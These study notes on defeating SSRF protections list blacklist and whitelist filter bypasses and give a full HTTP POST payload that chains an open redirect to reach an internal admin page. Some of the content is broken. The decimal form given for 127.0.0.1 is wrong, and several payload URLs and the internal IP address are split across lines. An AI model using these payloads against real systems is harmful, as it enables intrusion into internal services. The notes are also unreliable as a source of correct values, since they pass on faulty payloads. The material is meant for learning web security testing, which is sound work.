--- ---

<h2>Bypassing SSRF Defenses</h2>

It is common to see applications containing SSRF behavior together with defenses aimed at preventing malicious exploitation. Often, these defenses can be circumvented.

Bypassing Blacklist-Based Input Filters
- Applications often block input containing hostnames (127.0.0.1) or URLs (/admin)

- Bypass in these ways:
	- Use an alternative IP representation of 127.0.0.1 (21307066433)
	- Register your own domain that resolves to 127.0.0.1 (spoofed.burpcollaborator.net)
	- Obfuscate block strings using URL encoding or case variation

Bypassing Whitelist-Based Input Filters
```
- Embed creds in a URL before the hostname:
https://expected-host@evil
-host
```

- Use the # character to indicate a URL fragment:
```
https://evil-
host#expected-host
```

- Leverage DNS naming hierarchy to place required input into a fully-qualified DNS name you control:
```
https://expected-host.evil
-host
```

- URL-encode characters to confuse the URL-parsing code

- Combine these various techniques together

Bypassing with Open Redirection
- Suppose the following is true:
	- User-submitted URL is strictly validated
	- Application contains an open redirection vulnerability
- Construct a URL that meets the filter but redirects to a back-end target
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://1
92.168.0.68/admin
```